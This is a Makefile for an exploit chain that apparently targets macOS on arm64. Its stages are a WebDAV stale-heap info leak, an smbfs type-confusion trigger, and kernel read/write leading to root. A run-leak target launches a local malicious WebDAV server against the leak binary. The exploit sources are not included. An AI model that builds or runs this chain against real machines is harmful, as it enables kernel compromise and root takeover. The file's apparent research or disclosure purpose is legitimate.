# Makefile -- WebDAV stale-heap info-leak PoC (stage 0) + smbfs RqLs
# type-confusion trigger (stage 1) + kernel R/W and root stages (2/3).
#
# Targets:
#   make all        build everything into bin/
#   make leak       stage-0 leak PoC
#   make corrupt    stage-1 confusion trigger (panic demo / driver)
#   make krw        stage-2+3 kernel R/W + root (auto driver)
#   make run-leak   start the malicious webdav server, run bin/leak

CC      ?= /usr/bin/clang
CFLAGS  ?= -O2 -Wall -Wextra -arch arm64
BIN      = bin
PORT    ?= 8080
BODY_LEN ?= 0
LEAK_ARGS ?=

.PHONY: all leak corrupt krw run-leak clean

all: leak corrupt krw

leak: $(BIN)/leak

$(BIN)/leak: src/leak.c src/spray.c src/spray.h | $(BIN)
	$(CC) $(CFLAGS) -o $@ src/leak.c src/spray.c

corrupt: $(BIN)/corrupt

$(BIN)/corrupt: src/corrupt.c | $(BIN)
	$(CC) $(CFLAGS) -o $@ src/corrupt.c

krw: $(BIN)/krw

$(BIN)/krw: src/krw.c src/krw.h src/root.c src/spray.c src/spray.h src/offsets.h | $(BIN)
	$(CC) $(CFLAGS) -fblocks -o $@ src/krw.c src/root.c src/spray.c

$(BIN):
	mkdir -p $(BIN)

run-leak: leak
	@echo "[*] starting malicious WebDAV server on 127.0.0.1:$(PORT) (body-len=$(BODY_LEN))"
	@python3 server/webdav_server.py --port $(PORT) --body-len $(BODY_LEN) & \
	srv=$$!; \
	sleep 1; \
	$(BIN)/leak --server http://127.0.0.1:$(PORT) $(LEAK_ARGS); \
	rc=$$?; \
	kill $$srv 2>/dev/null; wait $$srv 2>/dev/null; \
	exit $$rc

clean:
	rm -rf $(BIN)
